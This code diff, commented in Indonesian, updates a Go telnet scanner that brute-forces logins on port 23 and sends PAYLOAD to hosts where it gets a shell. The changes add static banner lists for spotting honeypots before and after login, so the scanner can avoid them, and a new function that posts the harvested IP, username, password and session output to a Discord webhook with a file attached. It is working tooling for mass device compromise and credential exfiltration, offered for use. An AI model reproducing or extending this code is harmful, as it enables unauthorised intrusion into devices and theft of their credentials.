@@ -81,6 +81,7 @@ type CredentialResult struct {
 	Password string
 	Output   string
     Honeypot bool
+    Reasons  []string
 }
 
 type TelnetScanner struct {
@@ -95,6 +96,86 @@ type TelnetScanner struct {
 	wg               sync.WaitGroup
 	queueSize        int64
 }
+
+// Daftar banner/prompt mencurigakan (honeypot) setelah login (static list)
+var BANNERS_AFTER_LOGIN = []string{
+    // admin@localhost
+    "[admin@localhost ~]$",
+    "[admin@localhost ~]#",
+    "[admin@localhost tmp]$",
+    "[admin@localhost tmp]#",
+    "[admin@localhost /]$",
+    "[admin@localhost /]#",
+
+    // administrator@localhost
+    "[administrator@localhost ~]$",
+    "[administrator@localhost ~]#",
+    "[administrator@localhost tmp]$",
+    "[administrator@localhost tmp]#",
+    "[administrator@localhost /]$",
+    "[administrator@localhost /]#",
+
+    // cisco@localhost
+    "[cisco@localhost ~]$",
+    "[cisco@localhost ~]#",
+    "[cisco@localhost tmp]$",
+    "[cisco@localhost tmp]#",
+    "[cisco@localhost /]$",
+    "[cisco@localhost /]#",
+
+    // pi@raspberrypi
+    "[pi@raspberrypi ~]$",
+    "[pi@raspberrypi ~]#",
+    "[pi@raspberrypi tmp]$",
+    "[pi@raspberrypi tmp]#",
+    "[pi@raspberrypi /]$",
+    "[pi@raspberrypi /]#",
+
+    // root@LocalHost
+    "[root@LocalHost ~]$",
+    "[root@LocalHost ~]#",
+    "[root@LocalHost tmp]$",
+    "[root@LocalHost tmp]#",
+    "[root@LocalHost /]$",
+    "[root@LocalHost /]#",
+
+    // root@localhost
+    "[root@localhost ~]$",
+    "[root@localhost ~]#",
+    "[root@localhost tmp]$",
+    "[root@localhost tmp]#",
+    "[root@localhost /]$",
+    "[root@localhost /]#",
+
+    // ubnt@localhost
+    "[ubnt@localhost ~]$",
+    "[ubnt@localhost ~]#",
+    "[ubnt@localhost tmp]$",
+    "[ubnt@localhost tmp]#",
+    "[ubnt@localhost /]$",
+    "[ubnt@localhost /]#",
+
+    // user@localhost
+    "[user@localhost ~]$",
+    "[user@localhost ~]#",
+    "[user@localhost tmp]$",
+    "[user@localhost tmp]#",
+    "[user@localhost /]$",
+    "[user@localhost /]#",
+}
+
+// Daftar indikasi/banner mencurigakan sebelum login (pre-login)
+// Gunakan lowercase agar pencarian bisa case-insensitive (input juga diturunkan ke lowercase)
+var BANNERS_BEFORE_LOGIN = []string{
+    "honeypot",
+    "honeypots",
+	"Honeypot",
+	"Honeypots",
+	"HONEYPOT",
+	"HONEYPOTS",
+}
+
+// (Static list digunakan, tidak perlu init)
 
 // Discord Embed Structs
 type EmbedField struct {
@@ -171,6 +252,64 @@ func sendDiscordWebhookWithFile(host, username, password, output string) {
     sendDiscordWebhookWithFileGeneric("🔥 Valid Telnet Login Found!", 0x00ff00, host, username, password, output, "valid.txt")
 }
 
+// Webhook khusus honeypot/hypervisor, dengan alasan
+func sendHoneypotWebhook(host, username, password, output string, reasons []string) {
+    if DISCORD_WEBHOOK == "" {
+        return
+    }
+    reasonText := ""
+    if len(reasons) > 0 {
+        reasonText = strings.Join(reasons, ", ")
+    } else {
+        reasonText = "Unknown"
+    }
+    embed := DiscordEmbed{
+        Title:     "⚠️ Honeypot/Blocked Target",
+        Color:     0xff0000,
+        Timestamp: time.Now().Format(time.RFC3339),
+        Fields: []EmbedField{
+            {"IP:Port", fmt.Sprintf("`%s:23`", host), true},
+            {"Username", fmt.Sprintf("`%s`", username), true},
+            {"Password", fmt.Sprintf("`%s`", password), true},
+            {"Reasons", fmt.Sprintf("```%s```", reasonText), false},
+            {"Output", fmt.Sprintf("```%s```", output), false},
+        },
+    }
+    payloadStruct := DiscordWebhook{
+        Username:  "Telnet Scanner",
+        AvatarURL: "https://i.imgur.com/DIvu3F0.png",
+        Embeds:    []DiscordEmbed{embed},
+    }
+    jsonPayload, _ := json.Marshal(payloadStruct)
+
+    var buf bytes.Buffer
+    writer := multipart.NewWriter(&buf)
+    _ = writer.WriteField("payload_json", string(jsonPayload))
+
+    // Lampirkan honeypot.txt
+    if file, err := os.Open("honeypot.txt"); err == nil {
+        part, _ := writer.CreateFormFile("file", "honeypot.txt")
+        if data, err := os.ReadFile("honeypot.txt"); err == nil {
+            part.Write(data)
+        }
+        file.Close()
+    }
+    writer.Close()
+
+    req, err := http.NewRequest("POST", DISCORD_WEBHOOK, &buf)
+    if err != nil {
+        fmt.Println("[!] Request webhook error:", err)
+        return
+    }
+    req.Header.Set("Content-Type", writer.FormDataContentType())
+    resp, err := http.DefaultClient.Do(req)
+    if err != nil {
+        fmt.Println("[!] Send webhook error:", err)
+        return
+    }
+    defer resp.Body.Close()
+}
+
 func NewTelnetScanner() *TelnetScanner {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 	return &TelnetScanner{
@@ -218,10 +357,12 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 		}
 		data = append(data, buf[:n]...)
 
-        // Anti-honeypot via banner: jika banner mengandung kata honeypot/honeypots
+        // Anti-honeypot via banner (pre-login): cek terhadap daftar (case-insensitive)
         lowerData := bytes.ToLower(data)
-        if bytes.Contains(lowerData, []byte("honeypot")) || bytes.Contains(lowerData, []byte("honeypots")) {
-            return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true}
+        for _, sb := range BANNERS_BEFORE_LOGIN {
+            if bytes.Contains(lowerData, bytes.ToLower([]byte(sb))) {
+                return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true, Reasons: []string{"BANNER_PRELOGIN:" + sb}}
+            }
         }
 	}
 	conn.Write([]byte(username + "\n"))
@@ -252,16 +393,11 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 		}
 		data = append(data, buf[:n]...)
         if promptCheck(data, shellPrompts...) {
-            // Banner khusus yang harus di-skip bila sudah login (contoh: [root@LocalHost tmp]$)
-            if bytes.Contains(data, []byte("[root@LocalHost tmp]$")) || bytes.Contains(data, []byte("[root@LocalHost")) {
-                return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true}
-            }
-
-            // Deteksi honeypot sebelum menjalankan payload
-            isHP, hpOutput, _ := s.detectHoneypot(conn)
-            if isHP {
-                // Jangan jalankan payload pada honeypot
-                return true, CredentialResult{Host: host, Username: username, Password: password, Output: hpOutput, Honeypot: true}
+            // Deteksi pola banner dari daftar
+            for _, sb := range BANNERS_AFTER_LOGIN {
+                if bytes.Contains(data, []byte(sb)) {
+                    return true, CredentialResult{Host: host, Username: username, Password: password, Output: string(data), Honeypot: true, Reasons: []string{"BANNER_AFTER_LOGIN:" + sb}}
+                }
             }
 
             conn.Write([]byte(PAYLOAD + "\n"))
@@ -270,58 +406,6 @@ func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interfa
 		}
 	}
 	return false, "no shell prompt"
-}
-
-// Deteksi honeypot dengan cek ciri-ciri lingkungan yang sulit dipalsukan
-func (s *TelnetScanner) detectHoneypot(conn net.Conn) (bool, string, []string) {
-    // Perintah dibungkus sentinel untuk mengumpulkan output secara jelas
-    cmd := strings.Join([]string{
-        "echo HPT_START",
-        "(test -d /proc && echo PROC_OK || echo PROC_FAIL)",
-        "(test -r /proc/uptime && echo UPTIME_OK || echo UPTIME_FAIL)",
-        "(command -v sh >/dev/null && echo SH_OK || echo SH_FAIL)",
-        "(uname -a || echo UNAME_FAIL)",
-        "(id -u || echo ID_FAIL)",
-        "echo HPT_END",
-    }, "; ")
-    _, _ = conn.Write([]byte(cmd + "\n"))
-
-    // Baca hingga menemukan HPT_END atau timeout
-    var outBuf []byte
-    buf := make([]byte, 1024)
-    deadline := time.Now().Add(2 * time.Second)
-    for time.Now().Before(deadline) {
-        conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
-        n, _ := conn.Read(buf)
-        if n > 0 {
-            outBuf = append(outBuf, buf[:n]...)
-            if bytes.Contains(outBuf, []byte("HPT_END")) {
-                break
-            }
-        }
-    }
-    output := string(outBuf)
-
-    failed := []string{}
-    if strings.Contains(output, "PROC_FAIL") {
-        failed = append(failed, "PROC_FAIL")
-    }
-    if strings.Contains(output, "UPTIME_FAIL") {
-        failed = append(failed, "UPTIME_FAIL")
-    }
-    if strings.Contains(output, "SH_FAIL") {
-        failed = append(failed, "SH_FAIL")
-    }
-    if strings.Contains(output, "UNAME_FAIL") {
-        failed = append(failed, "UNAME_FAIL")
-    }
-    if strings.Contains(output, "ID_FAIL") {
-        failed = append(failed, "ID_FAIL")
-    }
-
-    // Aturan sederhana: >=2 indikasi gagal -> kemungkinan honeypot
-    isHoneypot := len(failed) >= 2
-    return isHoneypot, output, failed
 }
 
 func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
@@ -355,15 +439,13 @@ func (s *TelnetScanner) worker() {
                     fmt.Fprintf(fh, "%s:23 %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
                     fh.Close()
 
-                    // kirim embed honeypot + file honeypot.txt
-                    sendDiscordWebhookWithFileGeneric(
-                        "⚠️ Honeypot Detected",
-                        0xff0000,
+                    // kirim embed honeypot + file honeypot.txt dengan alasan
+                    sendHoneypotWebhook(
                         credResult.Host,
                         credResult.Username,
                         credResult.Password,
                         credResult.Output,
-                        "honeypot.txt",
+                        credResult.Reasons,
                     )
                 } else {
                     // valid credential
